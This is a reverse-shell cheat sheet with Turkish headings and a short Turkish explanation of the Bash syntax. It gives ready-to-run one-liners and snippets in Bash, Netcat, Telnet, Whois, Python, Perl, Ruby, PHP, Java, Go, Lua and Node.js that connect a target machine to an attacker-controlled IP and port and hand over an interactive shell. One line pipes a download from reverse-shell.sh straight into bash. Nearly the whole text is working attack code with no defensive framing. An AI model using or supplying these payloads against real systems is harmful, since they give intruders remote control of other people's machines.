## Bash | sh
```bash
curl https://reverse-shell.sh/10.0.0.1:3000 | bash
```

```bash
bash -i >& /dev/tcp/<SALDIRGAN-IP>/<PORT> 0>&1 # TCP
```

```bash
bash -i >& /dev/udp/<SALDIRGAN-IP>/<PORT> 0>&1 # UDP
```

```bash
0<&196;exec 196<>/dev/tcp/<SALDIRGAN-IP>/<PORT>; sh <&196 >&196 2>&196
```

```bash
exec 5<>/dev/tcp/<SALDIRGAN-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done
```

## Symbol
```bash
bash -c 'bash -i >& /dev/tcp/<SALDIRGAN-IP>/<PORT> 0>&1'
```

### Açıklama
- `bash -i`: Komutun bu kısmı etkileşimli (-i) bir Bash shell başlatır.
- `>&`: Komutun bu kısmı **hem standart çıktıyı** (`stdout`) hem de **standart hatayı** (`stderr`) **aynı hedefe** yönlendirmek için kullanılan bir kısaltmadır.
- `/dev/tcp/<SAKDIRGAN-IPSI>/<PORT>`: Bu, belirtilen IP adresi ve porta bir TCP bağlantısını temsil eder.
- `0>&1`: Komutun bu kısmı standart girdiyi (`stdin`) standart çıktı (`stdout`) ile aynı hedefe yönlendirir.

## Netcat
```bash
nc -e /bin/sh <SALDIRGAN-IP> <PORT>
```

```bash
nc <SALDIRGAN-IP> <PORT> | /bin/sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <SALDIRGAN-IP> <PORT> >/tmp/f
```

```bash
nc <SALDIRGAN-IP> <PORT1>| /bin/bash | nc <SALDIRGAN-IP> <PORT2>
```

```bash
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <SALDIRGAN-IP> <PORT> 1>/tmp/bkpipe
```

## Telnet
```bash
telnet <SALDIRGAN-IP> <PORT> | /bin/sh
```

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <SALDIRGAN-IP> <PORT> >/tmp/f
```

```bash
telnet <SALDIRGAN-IP> <PORT> | /bin/bash | telnet <SALDIRGAN-IP> <PORT>
```

```bash
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <SALDIRGAN-IP> <PORT> 1>/tmp/bkpipe
```

## Whois
- Saldırgan Makine
```bash
while true; do nc -l <port>; done
```

- Hedef Makine
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```

## Python
```bash
# Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

```bash
# IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");' 
```

## Perl
```bash
perl -e 'use Socket;$i="<SALDIRGAN-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

```bash
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

```bash
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

## PHP
```bash
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

```php
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>
```

```php
<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.0.0.1/4444 0>&1'"); ?>
```

## Java
```java
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```

## Lua
- Linux:
```bash
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
```
- Windows:
```bash
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```

## Node.JS
```js
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "10.0.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/;
})();
```

```js
require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.0.0.1/6767 0>&1'")
```
